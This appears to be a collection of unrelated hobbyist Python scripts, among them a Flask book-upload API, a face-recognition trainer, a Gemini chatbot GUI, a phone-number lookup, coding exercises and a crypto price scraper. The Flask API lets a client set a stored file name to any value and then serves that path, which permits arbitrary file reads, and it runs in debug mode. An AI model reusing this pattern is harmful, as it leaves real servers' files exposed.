    "from flask  import request, jsonify\nfrom config import app, db\nfrom model import Book\nfrom flask import Flask, request, jsonify, send_file\nimport json\n\nimport os\nfrom flask import Flask, flash, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\n\n\n@app.route('/')\ndef home():\n    return jsonify({'message': 'Hello, World!'})\n\n\n@app.route('/books', methods=['GET'])\ndef get_books():\n    books = Book.query.all()\n    books_json = [book.to_json() for book in books]\n    return jsonify(books_json)\n\n@app.route('/books/getbook/<int:id>', methods=['GET'])\ndef get_book(id):\n    book = Book.query.get(id)\n    if book is None:\n        return jsonify({'error': 'Book not found'}), 404\n    return jsonify(book.to_json())\n\n\n\nALLOWED_EXTENSIONS = {'pdf'}\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n\n@app.route('/books', methods=['POST'])\ndef create_book():\n    if 'file' not in request.files:\n        return jsonify({'error': 'No file part'}), 400\n\n    file = request.files['file']\n    \n    if file.filename == '':\n        return jsonify({'error': 'No selected file'}), 400\n    \n    if file and allowed_file(file.filename):\n        filename = secure_filename(file.filename)\n\n        app.logger.info(f'Saving file {filename} to {app.config[\"UPLOAD_FOLDER\"]}')\n\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        \n        jsonData = request.form.get('requestData')\n        requestData = json.loads(jsonData)\n\n        requestData = json.loads(jsonData)\n        title = requestData.get('title')\n\n        if not title:\n            return jsonify({'error': 'Please provide title'}), 400\n\n        # Save title, filename to the database\n        new_book = Book(title=title, fileName=filename)\n        db.session.add(new_book)\n        db.session.commit()\n\n        return jsonify({'message': 'Book uploaded successfully', 'book': new_book.to_json()}), 201\n    else:\n        return jsonify({'error': 'File type not allowed'}), 400\n    \n\n@app.route('/books/<int:id>', methods=['PATCH'])    \ndef update_book(id):\n    data = request.json\n    book = Book.query.get(id)\n    if book is None:\n        return jsonify({'error': 'Book not found'}), 404\n    if 'title' in data:\n        book.title = data['title']\n    if 'fileName' in data:\n        book.fileName = data['fileName']\n    try:\n        db.session.commit()\n    except Exception as e:\n        return jsonify({'error': str(e)}), 400\n    return jsonify(book.to_json(), \"Book updated successfully\")\n\n\n\n@app.route('/books/<int:id>', methods=['DELETE'])\ndef delete_book(id):\n    book = Book.query.get(id)\n    if book is None:\n        return jsonify({'error': 'Book not found'}), 404\n    db.session.delete(book)\n    db.session.commit()\n    return jsonify(\"Book deleted successfully\"), 204\n\n\n@app.route('/books/getbookpdf/<int:book_id>', methods=['GET'])\ndef fetch_book(book_id):\n    # Assuming book_id is present in the book database\n    book = Book.query.get(book_id)\n    if book is None:\n        return jsonify({'error': 'Book not found'}), 404\n\n    fileName = book.fileName  # Assuming your Book model has a fileName attribute\n    file_path = os.path.join(app.config['UPLOAD_FOLDER'], fileName)\n\n    if os.path.exists(file_path):\n        try:\n            return send_file(file_path, as_attachment=True)\n        except Exception as e:\n            return jsonify({\"error\": str(e)}), 500\n    else:\n        return jsonify({\"error\": \"Book file not found\"}), 404\n        \n        \n\n\nif __name__ == '__main__':\n    with app.app_context():\n        db.create_all()\n\n\n    app.run(debug=True)",
    "import os\nimport contextlib\n\nos.system(\"\")\n\n\nclass ColorProperty:\n    colors = (\n        \"red\",\n        \"green\",\n        \"cyan\",\n        \"blue\",\n        \"black\",\n        \"magenta\",\n        \"white\",\n        \"yellow\",\n        \"blank\",\n    )\n    fg_colors_dict = {\n        \"black\": \"\\033[30m\",\n        \"red\": \"\\033[31m\",\n        \"green\": \"\\033[32m\",\n        \"yellow\": \"\\033[33m\",\n        \"blue\": \"\\033[34m\",\n        \"magenta\": \"\\033[35m\",\n        \"cyan\": \"\\033[36m\",\n        \"white\": \"\\033[37m\",\n    }\n\n    bg_colors_dict = {\n        \"black\": \"\\033[40m\",\n        \"red\": \"\\033[41m\",\n        \"green\": \"\\033[42m\",\n        \"yellow\": \"\\033[43m\",\n        \"blue\": \"\\033[44m\",\n        \"magenta\": \"\\033[45m\",\n        \"cyan\": \"\\033[46m\",\n        \"white\": \"\\033[47m\",\n        \"blank\": \"\",\n    }\n\n    def __init__(self, default_fg_color, default_bg_color) -> None:\n        if default_fg_color is not None and (\n            default_fg_color not in self.colors or default_fg_color == \"blank\"\n        ):\n            raise ValueError(\n                f\"default foreground color {default_fg_color} is unsupported\"\n            )\n        if default_bg_color is not None and default_bg_color not in self.colors:\n            raise ValueError(\n                f\"default background color {default_bg_color} is unsupported\"\n            )\n        self.default_fg_color = default_fg_color\n        self.default_bg_color = default_bg_color\n\n        self._fg_color = None\n        self._bg_color = None\n\n    @property\n    def fg_color(self):\n        return self._fg_color or self.default_fg_color\n\n    @fg_color.setter\n    def fg_color(self, color):\n        if color not in self.colors:\n            raise ValueError(f\"color {color} not supported by terminal\")\n        self._fg_color = color\n\n    @property\n    def bg_color(self):\n        return self._bg_color or self.default_bg_color\n\n    @bg_color.setter\n    def bg_color(self, color):\n        if color is not None and color not in self.colors:\n            raise ValueError(f\"color {color} not supported by terminal\")\n        self._bg_color = color\n\n    @property\n    def final_color(self):\n        return self.fg_colors_dict[self.fg_color] + self.bg_colors_dict[self.bg_color]\n\n\nclass Font:\n    reset_font = \"\\033[0m\"\n    bold_font = \"\\033[1m\"\n    faint_font = \"\\033[2m\"\n    italics_font = \"\\033[3m\"\n    underline_font = \"\\033[4m\"\n    slow_blink_font = \"\\033[5m\"\n    rapid_blink_font = \"\\033[6m\"\n    invert_font = \"\\033[7m\"\n    hide_font = \"\\033[8m\"\n    strike_font = \"\\033[9m\"\n\n\nclass TerminalCursor:\n\n    def __init__(self, end_chars=\"\\n\") -> None:\n        self.end_chars = end_chars\n\n    def toggle(self, visiblity):\n        if visiblity:\n            print(\"\\033[?25h\", end=\"\")\n        else:\n            print(\"\\033[?25l\", end=\"\")\n\n    def move_up(self, by):\n        end = self.end_chars\n        if not by:\n            return\n        print(f\"\\033[{by}A\", end=end)\n\n    def move_down(self, by):\n        end = self.end_chars\n        if not by:\n\n            return\n        print(f\"\\033[{by}B\", end=end)\n\n    def move_left(self, by):\n        end = self.end_chars\n        if not by:\n            return\n        print(f\"\\033[{by}D\", end=end)\n\n    def move_right(self, by):\n        end = self.end_chars\n        if not by:\n            return\n        print(f\"\\033[{by}C\", end=end)\n\n    def set_cursor_position(self, x, y):\n        end = self.end_chars\n        print(f\"\\033[{x};{y}H\", end=end)\n\n\n@contextlib.contextmanager\ndef terminal_cursor(visible=None, end=\"\\n\"):\n    crsr = TerminalCursor(end_chars=end)\n    if visible:\n        crsr.toggle(visiblity=visible)\n    try:\n        yield crsr\n    finally:\n        if visible:\n            crsr.toggle(visiblity=not visible)\n",
    "from tkinter import *\r\nfrom tkinter import ttk\r\nfrom PIL import Image, ImageTk\r\nfrom tkinter import messagebox\r\nimport mysql.connector\r\nimport cv2\r\nimport os\r\nimport numpy as np\r\n\r\n\r\nclass Train:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.geometry(\"1530x790+0+0\")\r\n        self.root.title(\"Face Recognition System\")\r\n\r\n        # title\r\n        title_lbl = Label(self.root, text=\"TRAIN DATA SET\", font=(\"serif\", 30, \"bold\"),\r\n                          bg=\"white\", fg=\"red\")\r\n        title_lbl.place(x=0, y=0, width=1530, height=45)\r\n\r\n        # Images top\r\n        img_top = Image.open(r\"college_images/facialrecognition.png\")\r\n        img_top = img_top.resize((1530, 325), Image.ADAPTIVE)\r\n        self.photoimg_top = ImageTk.PhotoImage(img_top)\r\n\r\n        first_label = Label(self.root, image=self.photoimg_top)\r\n        first_label.place(x=0, y=55, width=1530, height=325)\r\n\r\n        # button train data\r\n        btn1_1 = Button(self.root, text=\"TRAIN DATA\", command=self.trai_classifier, cursor=\"hand2\",\r\n                        font=(\"serif\", 20, \"bold\"),\r\n                        bg=\"darkblue\", fg=\"white\")\r\n        btn1_1.place(x=0, y=380, width=1530, height=60)\r\n\r\n        # Images down\r\n        img_bottom = Image.open(r\"college_images/opencv_face_reco_more_data.jpg\")\r\n        img_bottom = img_bottom.resize((1530, 325), Image.ADAPTIVE)\r\n        self.photoimg_bottom = ImageTk.PhotoImage(img_bottom)\r\n\r\n        first_label = Label(self.root, image=self.photoimg_bottom)\r\n        first_label.place(x=0, y=440, width=1530, height=325)\r\n\r\n    def trai_classifier(self):\r\n        data_dir = (\"data\")\r\n        path = [os.path.join(data_dir, file) for file in os.listdir(data_dir)]\r\n\r\n        faces = []\r\n        ids = []\r\n\r\n        for image in path:\r\n            img = Image.open(image).convert('L')  # grayscale image\r\n            imageNp = np.array(img, 'uint8')\r\n            id = int(os.path.split(image)[1].split('.')[1])\r\n\r\n            faces.append(imageNp)\r\n            ids.append(id)\r\n            cv2.imshow(\"Training\", imageNp)\r\n            cv2.waitKey(1) == 13\r\n\r\n        ids = np.array(ids)\r\n\r\n        #         train the classifier and save\r\n\r\n        clf = cv2.face.LBPHFaceRecognizer_create()\r\n        clf.train(faces, ids)\r\n        clf.write(\"classifier.xml\")\r\n        cv2.destroyAllWindows()\r\n        messagebox.showinfo(\"Result\", \"Training datasets completed\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    root = Tk()\r\n    obj = Train(root)\r\n    root.mainloop()\r\n",
    "import tkinter as tk\r\nimport google.generativeai as genai\r\nimport tkinter.filedialog as fd\r\nimport tkinter.messagebox as mb\r\nfrom tkinter import ttk\r\nimport speech_recognition as sr\r\nimport threading\r\nimport random\r\nfrom gtts import gTTS\r\nimport os\r\n\r\n# Configure GenerativeAI\r\ngenai.configure(api_key=\"your api\")\r\ngeneration_config = {\r\n    \"temperature\": 0.9,\r\n    \"top_p\": 1,\r\n    \"top_k\": 1,\r\n    \"max_output_tokens\": 2048,\r\n}\r\nsafety_settings = [\r\n    {\"category\": \"HARM_CATEGORY_HARASSMENT\", \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"},\r\n    {\"category\": \"HARM_CATEGORY_HATE_SPEECH\", \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"},\r\n    {\"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\", \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"},\r\n    {\"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\", \"threshold\": \"BLOCK_MEDIUM_AND_ABOVE\"},\r\n]\r\nmodel = genai.GenerativeModel(\r\n    model_name=\"gemini-1.0-pro-001\",\r\n    generation_config=generation_config,\r\n    safety_settings=safety_settings,\r\n)\r\nconvo = model.start_chat()\r\n\r\n# Function to send message and receive response\r\ndef send_message(event=None):\r\n    user_message = user_input.get()\r\n    chat_log.config(state=tk.NORMAL)\r\n    chat_log.insert(tk.END, \"You: \" + user_message + \"\\n\", \"user\")\r\n    response_text = get_response(user_message)\r\n    chat_log.insert(tk.END, \"Nexiloop AI: \" + response_text + \"\\n\", \"model\")\r\n    speak(response_text)\r\n    chat_log.config(state=tk.DISABLED)\r\n    user_input.delete(0, tk.END)\r\n\r\n# Function to get response from the AI\r\ndef get_response(user_message):\r\n    user_message = user_message.lower()\r\n    if \"who create you\" in user_message or \"who made you\" in user_message:\r\n        return \"I was created by Nexiloop AI and Mohamed Rayen.\"\r\n    elif \"who are you\" in user_message:\r\n        return \"I am Nexiloop AI, trained by Nexiloop and Mohamed Rayen.\"\r\n    else:\r\n        try:\r\n            response = convo.send_message(user_message)\r\n            return response.text\r\n        except genai.StopCandidateException as e:\r\n            return \"Conversation finished: \" + e.finish_reason\r\n\r\n# Function to clear chat log\r\ndef clear_chat():\r\n    chat_log.config(state=tk.NORMAL)\r\n    chat_log.delete(1.0, tk.END)\r\n    chat_log.config(state=tk.DISABLED)\r\n\r\n# Function to save chat history to a file\r\ndef save_chat():\r\n    filename = fd.asksaveasfilename(defaultextension=\".txt\", filetypes=[(\"Text files\", \"*.txt\")])\r\n    if filename:\r\n        with open(filename, \"w\") as file:\r\n            chat_content = chat_log.get(1.0, tk.END)\r\n            file.write(chat_content)\r\n        mb.showinfo(\"Success\", \"Chat history saved successfully.\")\r\n\r\n# Function to load chat history from a file\r\ndef load_chat():\r\n    filename = fd.askopenfilename(filetypes=[(\"Text files\", \"*.txt\")])\r\n    if filename:\r\n        with open(filename, \"r\") as file:\r\n            chat_content = file.read()\r\n            chat_log.config(state=tk.NORMAL)\r\n            chat_log.delete(1.0, tk.END)\r\n            chat_log.insert(tk.END, chat_content)\r\n            chat_log.config(state=tk.DISABLED)\r\n        mb.showinfo(\"Success\", \"Chat history loaded successfully.\")\r\n\r\n# Function to exit the application\r\ndef exit_app():\r\n    if mb.askyesno(\"Exit\", \"Are you sure you want to exit?\"):\r\n        root.destroy()\r\n\r\n# Function to change the chat theme\r\ndef change_theme():\r\n    color = fd.askcolor()[1]\r\n    root.configure(bg=color)\r\n    chat_log.config(bg=color)\r\n    user_input.config(bg=color)\r\n\r\n# Function for voice input using SpeechRecognition library\r\ndef voice_input():\r\n    r = sr.Recognizer()\r\n\r\n    with sr.Microphone() as source:\r\n        r.adjust_for_ambient_noise(source)\r\n        print(\"Say something...\")\r\n        audio = r.listen(source)\r\n\r\n    try:\r\n        user_message = r.recognize_google(audio)\r\n        user_input.delete(0, tk.END)\r\n        user_input.insert(tk.END, user_message)\r\n        send_message()\r\n    except sr.UnknownValueError:\r\n        print(\"Google Speech Recognition could not understand audio\")\r\n    except sr.RequestError as e:\r\n        print(\"Could not request results from Google Speech Recognition service; {0}\".format(e))\r\n\r\n# Function to suggest random emojis\r\ndef suggest_emoji():\r\n    emojis = [\"\ud83d\ude0a\", \"\ud83c\udf89\", \"\ud83d\udc4d\", \"\ud83d\ude02\", \"\ud83e\udd14\", \"\ud83d\ude0e\", \"\ud83e\udd73\", \"\ud83d\udc4f\"]\r\n    random_emoji = random.choice(emojis)\r\n    user_input.insert(tk.END, random_emoji)\r\n\r\n# Function to generate a random joke\r\ndef generate_joke():\r\n    jokes = [\r\n        \"Why don't scientists trust atoms? Because they make up everything!\",\r\n        \"I'm reading a book on anti-gravity. It's impossible to put down!\",\r\n        \"Why did the scarecrow win an award? Because he was outstanding in his field!\",\r\n        \"What did one plate say to the other plate? Dinner's on me!\",\r\n        \"Did you hear about the mathematician who's afraid of negative numbers? He'll stop at nothing to avoid them!\",\r\n    ]\r\n    random_joke = random.choice(jokes)\r\n    chat_log.config(state=tk.NORMAL)\r\n    chat_log.insert(tk.END, \"Nexiloop AI: \" + random_joke + \"\\n\", \"model\")\r\n    speak(random_joke)\r\n\r\n# Function",
    "import phonenumbers\r\nfrom phonenumbers import geocoder, carrier, timezone\r\nfrom colorama import init, Fore\r\n\r\n# Initialisation de colorama\r\ninit(autoreset=True)\r\n                    \r\nphone_number = input(Fore.RED + \"\"\"\r\n                     \r\n@DT190_R                   \r\n\r\n               ____\r\n              '-..-'               .-.     \ud83d\udcde\r\n             ___||___           .-/ /-.\r\n            /_______/|         / / / /\r\n            |       ||        / / / /\r\n            |   o   |/       / / / / \r\n   \u260e\ufe0f       '---`(--' DT190 />>=< \r\n\r\n\r\n                                                               \r\nPhone Number -> \"\"\")\r\ntry:\r\n    parsed_number = phonenumbers.parse(phone_number, None)\r\n    if phonenumbers.is_valid_number(parsed_number):\r\n        if phone_number.startswith(\"+\"):\r\n            country_code = \"+\" + phone_number[1:3] \r\n        else:\r\n            country_code = \"None\"\r\n        operator = carrier.name_for_number(parsed_number, \"fr\")\r\n        type_number = \"Mobile\" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else \"Fixe\"\r\n        timezones = timezone.time_zones_for_number(parsed_number)\r\n        timezone_info = timezones[0] if timezones else None\r\n        country = phonenumbers.region_code_for_number(parsed_number)\r\n        region = geocoder.description_for_number(parsed_number, \"fr\")\r\n        formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL)\r\n        status = \"Valid\"\r\n    else:\r\n        formatted_number = \"None\"\r\n        region = \"None\"\r\n        country = \"None\"\r\n        operator = \"None\"\r\n        type_number = \"None\"\r\n        timezone_info = \"None\"\r\n        country_code = \"None\"\r\n        status = \"Invalid\"\r\n\r\n    print(f\"\"\"\r\n[+] Phone        : {phone_number}\r\n[+] Formatted    : {formatted_number}\r\n[+] Status       : {status}\r\n[+] Country Code : {country_code}\r\n[+] Country      : {country}\r\n[+] Region       : {region}\r\n[+] Timezone     : {timezone_info}\r\n[+] Operator     : {operator}\r\n[+] Type Number  : {type_number}\r\n        \r\n    [         @DT190         ]\r\n\r\n\"\"\")\r\n    # Continue()\r\n    # Reset()\r\nexcept:\r\n    print(\"C'est invalide mon bebou ! [Format: +(country_code)(number)] [Ex: +442012345678 or +33623456789]\")\r\n    # Continue()\r\n    # Reset()",
    "# Scenario\n# Do you know what a palindrome is?\n\n# It's a word which look the same when read forward and backward. For example, \"kayak\" is a palindrome, while \"loyal\" is not.\n\n# Your task is to write a program which:\n\n# asks the user for some text;\n# checks whether the entered text is a palindrome, and prints result.\n# Note:\n\n# - assume that an empty string isn't a palindrome;\n# - treat upper- and lower-case letters as equal;\n# - spaces are not taken into account during the check - treat them as non-existent;\n# - there are more than a few correct solutions - try to find more than one.\n\n# ######################################################################################################################\n\n# Test your code using the data we've provided.\n\n# Test data\n# Sample input:\n\n# Ten animals I slam in a net\n\n# Sample output:\n\n# It's a palindrome\n\n\n# Sample input:\n\n# Eleven animals I slam in a net\n\n# Sample output:\n\n# It's not a palindrome\n\n# ######################################################################################################################\n\n\ndef isPal(txt1):\n    y = 0\n    txt1 = txt1.replace(\" \", \"\").lower()\n    for i in range(len(txt1) - 1, -1, -1):\n        if txt1[i] != txt1[y]:\n            return 0\n        y += 1\n    return 1\n\ntxt = input(\"Please enter the text:\\n\")\nval = isPal(txt)\nif val:\n    print(\"It's a palindrome\")\nelse:\n    print(\"It's not a palindrome\")\n",
    "# 217. Contains Duplicate\n\n# Given an integer array nums, return true if any value appears at least twice in the array, and return false if every element is distinct. \n\n# Example 1:\n\n# Input: nums = [1,2,3,1]\n# Output: true\n# Example 2:\n\n# Input: nums = [1,2,3,4]\n# Output: false\n# Example 3:\n\n# Input: nums = [1,1,1,3,3,4,3,2,4,2]\n# Output: true\n \n\n# Constraints:\n\n# 1 <= nums.length <= pow(10,5)\n# pow(-10,9) <= nums[i] <= pow(10,9)\n\n####################################################################################################\n\n\nclass Solution(object):\n    def containsDuplicate(self, nums):\n        \"\"\"\n        :type nums: List[int]\n        :rtype: bool\n        \"\"\"\n            \n            # First Attempt #\n            # cont=[]\n            # if len(nums) == 0 or len(nums) > pow(10,5): return\n            # for i in nums:\n            #     if pow(-10,9)>i or i>pow(10,9): return\n            #     if not i in cont:\n            #         cont.append(i)\n            #     else: return 1\n            # return 0\n\n            # Second Attempt #\n            # if len(nums) == 0 or len(nums) > pow(10,5): return\n            # for i in nums:\n            #     if pow(-10,9)>i or i>pow(10,9): return\n            # if nums.count(i)!=1: return 1\n            # return 0\n\n\n\n            # Third attempt #\n        if len(nums) == 0 or len(nums) > pow(10,5): return\n        v={}\n        for i in nums:\n            v[i]=v.get(i,-1)+1\n            if v[i]: return 1\n        return 0",
    "import threading\nimport time\nimport tkinter as tk\nimport datetime\nfrom threading import Thread\nfrom playwright.sync_api import sync_playwright\n#\n#\n# initializes sets\ncrypto_name = ''\nenable_bot = False\ncrypto_inventory = 0\nbuy_price = 0\nsell_price = 0\n#\n#\n# collects crypto prices\ndef spider_prices():\n    global price_label, run_threads, total_amount, clock, crypto_name, buy_price, sell_price\n    if crypto_name != '':\n        print(f'Seeking the cryptocurrency: {crypto_name.upper()}')\n        with sync_playwright() as p:\n            browser = p.chromium.launch()\n            context = browser.new_context()\n            page = context.new_page()\n            try:\n                page.goto(f'https://coinmarketcap.com/currencies/{crypto_name}')\n                print('1')\n                price_element = page.wait_for_selector('#section-coin-overview > div.sc-f70bb44c-0.flfGQp.flexStart.alignBaseline > span')\n                print('2')\n                stop_button.config(state=tk.NORMAL)\n                print('3')\n                bot_button.config(state=tk.NORMAL)\n                print('4')\n            except:\n                print('ERROR: Couldn\\'t find server')\n                price_label.config(text='ERROR: Couldn\\'t reach server')\n                yes_button.config(state=tk.NORMAL)\n                no_button.config(state=tk.NORMAL)\n                quit_button.config(state=tk.NORMAL)\n                run_threads = False\n            previous_price = None\n            previous_clock = None\n            while run_threads:\n                price = price_element.text_content()\n                clock = datetime.datetime.now().strftime('%I:%M %p')\n                precise_clock = datetime.datetime.now().strftime('%I:%M:%S %p')\n                if price != previous_price:\n                    price_label.config(text=f'{clock} - {crypto_name.upper()} Price: {price}')\n                    if previous_price != None:\n                        aged_price_label.config(fg='gray', text=f'{previous_clock} - {crypto_name.upper()} Price: {previous_price}', font=('helvetica', 8))\n                    print(f'{precise_clock} - Current {crypto_name} price: {price}')\n                    previous_price = price\n                    previous_clock = clock\n                    buy_price = -(float(price.replace('$', '').replace(',', '')))\n                    sell_price = float(price.replace('$', '').replace(',', ''))\n            context.close()\n            browser.close()\n            print('Closing spider thread..')\n    else:\n        crypto_name = 'bitcoin'\n        spider_prices()\n#\n#\n# buy / sell functions\ndef buy_sell():\n    price_label.config(text=f'Prices for {crypto_name.upper()} are updating...')\n    buy_button.config(text='Buy')\n    sell_button.config(text='Sell')\n    buy_button.config(state=tk.DISABLED)\n    sell_button.config(state=tk.DISABLED)\n    while buy_price == 0:\n        if run_threads == False:\n            break\n    while run_threads:\n        if buy_entry.get() == '':\n            buy_button.config(state=tk.DISABLED)\n        elif buy_entry.get() != '':\n            try:\n                buy_totals = (int(buy_entry.get()) * buy_price) + total_amount\n                if buy_totals >= 0:\n                    buy_button.config(state=tk.NORMAL, command=buy_method)\n                else:\n                    buy_button.config(state=tk.DISABLED)\n            except:\n                buy_button.config(state=tk.DISABLED)\n        else:\n            buy_button.config(state=tk.DISABLED)\n        if sell_entry.get() == '':\n            sell_button.config(state=tk.DISABLED)\n        elif crypto_inventory > 0 and sell_entry.get() != '':\n            try:\n                sell_totals = int(sell_entry.get()) * sell_price - total_amount\n                if sell_totals >= 0:\n                    sell_button.config(state=tk.NORMAL, command=sell_method)\n                else:\n                    sell_button.config(state=tk.DISABLED)\n            except:\n                sell_button.config(state=tk.DISABLED)\n        else:\n            sell_button.config(state=tk.DISABLED)\n    print('Closing finance thread..')\ndef buy_method():\n    global total_amount, crypto_inventory\n    crypto_increase = int(buy_entry.get())\n    total_amount += buy_price * crypto_increase\n    crypto_inventory += crypto_increase\n    update_totals()\n    bought_label.config(fg='gray', text=f'{clock} - Bought {crypto_name.upper()} at ${sell_price}')\n    buy_entry.delete(0, tk.END)\n    buy_button.config(state=tk.DISABLED)\ndef sell_method():\n    global total_amount, crypto_inventory\n    crypto_decrease = int(sell_entry.get())\n    total_amount += sell_price * crypto_decrease\n    crypto_inventory -= crypto_decrease\n    update_totals()\n    sold_label.config(fg='gray', text=f'{clock} - Sold {crypto_name.upper()} at ${sell_price}')\n    sell_entry.delete(0, tk.END)\n    sell_button.config(state=tk.DISABLED)\n#\n#\n# thread management\ndef thread_management():\n    global run_threads\n    run_threads = True\n    yes_button.config(state",
    "import sqlite3\nfrom random import randint\n\ndef create_connection():\n    conn = None\n    try:\n        conn = sqlite3.connect('data.db', check_same_thread=False)\n        return conn\n    except sqlite3.Error as e:\n        print(e)\n    return conn\n\ndef create_table(conn):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS Users (\n        user_id INTEGER PRIMARY KEY,\n        user_length INTEGER,\n        user_use_letters INTEGER,\n        user_use_digits INTEGER,\n        user_use_punctuation INTEGER)\n        \"\"\")\n    except sqlite3.Error as e:\n        print(e)\n\ndef insert_user(conn, user_id, length, use_letters, use_digits, use_punctuation):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"\n        INSERT INTO Users (user_id, user_length, user_use_letters, user_use_digits, user_use_punctuation)\n        VALUES (?, ?, ?, ?, ?)\n        \"\"\", (user_id, length, use_letters, use_digits, use_punctuation))\n        conn.commit()\n    except sqlite3.Error as e:\n        print(e)\n\ndef update_user_settings(conn, user_id, length, use_letters=True, use_digits=True, use_punctuation=True):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"\"\"\n        UPDATE Users\n        SET user_length = ?,\n            user_use_letters = ?,\n            user_use_digits = ?,\n            user_use_punctuation = ?\n        WHERE user_id = ?\n        \"\"\", (length, use_letters, use_digits, use_punctuation, user_id))\n        conn.commit()\n    except sqlite3.Error as e:\n        print(e)\n\n\ndef delete_user(conn, user_id):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"DELETE FROM Users WHERE user_id = ?\", (user_id,))\n        conn.commit()\n    except sqlite3.Error as e:\n        print(e)\n\n\ndef get_all_users(conn):\n    try:\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT * FROM Users\")\n        rows = cursor.fetchall()\n        return rows\n    except sqlite3.Error as e:\n        print(e)\n\ndef close_connection(conn):\n    if conn:\n        conn.close()\n\nclass UserSettings:\n    def __init__(self, user_id):\n        self.user_id = user_id\n        self._load_settings()\n\n    def _load_settings(self):\n        conn = sqlite3.connect(\"data.db\")\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT user_use_letters, user_use_digits, user_use_punctuation, user_length FROM Users WHERE user_id = ?\", (self.user_id,))\n        settings = cursor.fetchone()\n        if settings:\n            self.use_letters, self.use_digits, self.use_punctuation, self.user_length = settings\n        else:\n            # \u0415\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u0432 \u0431\u0430\u0437\u0435 \u0434\u0430\u043d\u043d\u044b\u0445, \u0443\u0441\u0442\u0430\u043d\u0430\u0432\u043b\u0438\u0432\u0430\u0435\u043c \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u043e \u0443\u043c\u043e\u043b\u0447\u0430\u043d\u0438\u044e\n            self.user_length = 8\n            self.use_letters = True\n            self.use_digits = True\n            self.use_punctuation = True",
    "import numpy as np\nimport imutils\nimport cv2\nimport time\nimport serial\n\n# Open serial connection to Arduino\nser = serial.Serial('COM4', 9600)\n\nprototxt = \"MobileNetSSD_deploy.prototxt.txt\"\nmodel = \"MobileNetSSD_deploy.caffemodel\"\nconfThresh = 0.5\n\nCLASSES = [\"background\", \"aeroplane\", \"bicycle\", \"bird\", \"boat\",\n           \"bottle\", \"bus\", \"car\", \"cat\", \"chair\", \"cow\", \"diningtable\",\n           \"dog\", \"horse\", \"motorbike\", \"Human\", \"pottedplant\", \"sheep\",\n           \"sofa\", \"train\", \"tvmonitor\", \"mobile\"]\n\nMESSAGE_MAPPING = {\n    \"background\": b'0',\n    \"aeroplane\": b'1',\n    \"bicycle\": b'2',\n    \"bird\": b'3',\n    \"boat\": b'4',\n    \"bottle\": b'5',\n    \"bus\": b'6',\n    \"car\": b'7',\n    \"cat\": b'8',\n    \"chair\": b'9',\n    \"cow\": b'10',\n    \"diningtable\": b'11',\n    \"dog\": b'12',\n    \"horse\": b'13',\n    \"motorbike\": b'14',\n    \"Human\": b'h',\n    \"pottedplant\": b'16',\n    \"sheep\": b'17',\n    \"sofa\": b'18',\n    \"train\": b'19',\n    \"tvmonitor\": b'20',\n    \"mobile\": b'21'\n}\n\nCOLORS = np.random.uniform(0, 255, size=(len(CLASSES), 3))\n\nprint(\"Loading model.......\")\nnet = cv2.dnn.readNetFromCaffe(prototxt, model)\nprint(\"Model Loaded\")\nprint(\"Starting Camera Feed.....\")\n\nvs = cv2.VideoCapture(0)\ntime.sleep(2.0)\n\nwhile True:\n    ret, frame = vs.read()\n    frame = imutils.resize(frame, width=1000)\n    (h, w) = frame.shape[:2]\n\n    imResizeBlob = cv2.resize(frame, (300, 300))\n    blob = cv2.dnn.blobFromImage(imResizeBlob, 0.007843, (300, 300), 127.5)\n\n    net.setInput(blob)\n    detections = net.forward()\n\n    detShape = detections.shape[2]\n    object_present = False  # Initialize object presence flag\n\n    for i in np.arange(0, detShape):\n        confidence = detections[0, 0, i, 2]\n        if confidence > confThresh:\n            idx = int(detections[0, 0, i, 1])\n            print(\"ClassID: \", detections[0, 0, i, 1])\n            box = detections[0, 0, i, 3:7] * np.array([w, h, w, h])\n            (startX, startY, endX, endY) = box.astype(\"int\")\n\n            label = \"{} : {:.2f}%\".format(CLASSES[idx], confidence * 100)\n            cv2.rectangle(frame, (startX, startY), (endX, endY), COLORS[idx], 2)\n\n            if startY - 15 > 15:\n                y = startY - 15\n            else:\n                y = startY + 15\n\n            cv2.putText(frame, label, (startX, y), cv2.FONT_HERSHEY_SIMPLEX, 0.5, COLORS[idx], 2)\n\n            object_present = True  # Set object presence flag if object is detected\n\n            # Send different messages to Arduino based on the detected object\n            label = CLASSES[idx]\n            message = MESSAGE_MAPPING.get(label, b'0')  # Get the corresponding message from the mapping\n            print(\"Object Detected: \", label)\n            print(\"Sending message to Arduino:\", message)\n            ser.write(message)\n\n    cv2.imshow(\"frame\", frame)\n    \n    # Send object presence status to Arduino\n    if not object_present:\n        ser.write(b'n')\n\n    key = cv2.waitKey(1)\n    if key == 27:\n        break\n\nvs.release()\ncv2.destroyAllWindows()",
